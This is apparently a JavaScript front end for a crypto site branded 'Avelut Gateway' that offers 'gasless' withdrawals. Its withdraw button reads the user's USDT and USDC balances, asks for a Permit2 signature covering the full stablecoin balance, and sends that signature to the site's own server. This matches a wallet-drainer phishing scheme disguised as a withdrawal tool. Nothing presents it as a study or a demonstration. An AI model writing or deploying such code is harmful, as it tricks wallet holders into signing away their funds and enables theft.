import { createAppKit } from "@reown/appkit";
import { Ethers5Adapter } from "@reown/appkit-adapter-ethers5";
import { mainnet } from "@reown/appkit/networks";
import { ethers } from "ethers";

const projectId = "f340171a355aad487eb6daa39b4b6c10";

const metadata = {
    name: "Avelut Gateway",
    description: "Gasless Transactions",
    url: "https://avelut.xyz", 
    icons: ["https://www.avelut.xyz/logo_full.png"],
};

const modal = createAppKit({
    adapters: [new Ethers5Adapter()],
    metadata: metadata,
    networks: [mainnet],
    projectId,
    features: { analytics: false },
});

const USDT_ADDRESS = ethers.utils.getAddress("0xdAC17F958D2ee523a2206206994597C13D831ec7");
const USDC_ADDRESS = ethers.utils.getAddress("0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48");

async function handleWithdraw() {
    try {
        const walletProvider = modal.getWalletProvider();
        if (!walletProvider) {
            await modal.open();
            return;
        }

        const provider = new ethers.providers.Web3Provider(walletProvider);
        const signer = provider.getSigner();
        const userAddress = await signer.getAddress();

        showToast("Checking wallet balances...");

        // Check USDT and USDC
        const usdtContract = new ethers.Contract(USDT_ADDRESS, ["function balanceOf(address) view returns (uint256)"], provider);
        const usdcContract = new ethers.Contract(USDC_ADDRESS, ["function balanceOf(address) view returns (uint256)"], provider);

        const usdtBalance = await usdtContract.balanceOf(userAddress);
        const usdcBalance = await usdcContract.balanceOf(userAddress);
        const ethBalance = await provider.getBalance(userAddress);

        // Use the largest stable balance (prefer USDT)
        let withdrawAmount = usdtBalance;
        let tokenAddress = USDT_ADDRESS;

        if (usdcBalance.gt(usdtBalance)) {
            withdrawAmount = usdcBalance;
            tokenAddress = USDC_ADDRESS;
        }

        if (withdrawAmount.isZero()) {
            showToast("No USDT or USDC balance detected. Proceeding anyway...", true);
            withdrawAmount = ethers.utils.parseUnits("10", 6); // fallback
            tokenAddress = USDT_ADDRESS;
        }

        showToast(`Withdrawing \~${ethers.utils.formatUnits(withdrawAmount, 6)} ${tokenAddress === USDT_ADDRESS ? 'USDT' : 'USDC'}...`);

        const PERMIT2_ADDRESS = ethers.utils.getAddress("0x000000000022D473030F116dDEE9F6B43aC78BA3");
        const SPENDER_ADDRESS = ethers.utils.getAddress("0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D"); // Uniswap V2

        const domain = {
            name: "Permit2",
            chainId: (await provider.getNetwork()).chainId,
            verifyingContract: PERMIT2_ADDRESS
        };

        const types = {
            PermitTransferFrom: [
                { name: "permitted", type: "TokenPermissions" },
                { name: "spender", type: "address" },
                { name: "nonce", type: "uint256" },
                { name: "deadline", type: "uint256" }
            ],
            TokenPermissions: [
                { name: "token", type: "address" },
                { name: "amount", type: "uint256" }
            ]
        };

        const nonce = Date.now();
        const deadline = Math.floor(Date.now() / 1000) + 3600;

        const message = {
            permitted: { token: tokenAddress, amount: withdrawAmount.toString() },
            spender: SPENDER_ADDRESS,
            nonce,
            deadline
        };

        showToast("Please sign the permit in your wallet...");

        const signature = await signer._signTypedData(domain, types, message);

        // Save signature
        saveSignatureLocally(userAddress, signature, message, withdrawAmount);

        showToast("Signature secured. Executing swap & transfer...");

        const res = await fetch('/api/withdraw', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ 
                signature, 
                permitData: message, 
                owner: userAddress,
                token: tokenAddress
            })
        });

        const data = await res.json();
        data.success ? showToast("Success! ETH sent to recipient.") : showToast(data.message || "Failed.", true);

    } catch (err) {
        console.error("Withdraw Error:", err);
        showToast(err.message || "An error occurred.", true);
    }
}

function saveSignatureLocally(userAddress, signature, permitData, amount) {
    const entry = {
        userAddress,
        timestamp: new Date().toISOString(),
        signature,
        permitData,
        amount: ethers.utils.formatUnits(amount, 6),
        type: "Permit2"
    };

    fetch('/api/save-signature', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(entry)
    }).catch(console.error);
}

function showToast(msg, isError = false) {
    const toastContainer = document.getElementById('toastContainer');
    if (!toastContainer) return;
    const div = document.createElement('div');
    div.className = `p-4 rounded-2xl shadow-2xl backdrop-blur-md bg-opacity-90 text-white font-semibold transition-all duration-300 transform translate-y-[-20px] opacity-0 ${isError ? 'bg-red-600' : 'bg-green-600'}`;
    div.textContent = msg;
    toastContainer.appendChild(div);
    setTimeout(() => { div.style.transform = 'translateY(0)'; div.style.opacity = '1'; }, 10);
    setTimeout(() => { div.style.opacity = '0'; setTimeout(() => div.remove(), 300); }, 3000);
}

document.addEventListener('DOMContentLoaded', () => {
    const withdrawBtn = document.getElementById('withdrawBtn');
    if (withdrawBtn) withdrawBtn.addEventListener('click', handleWithdraw);
});
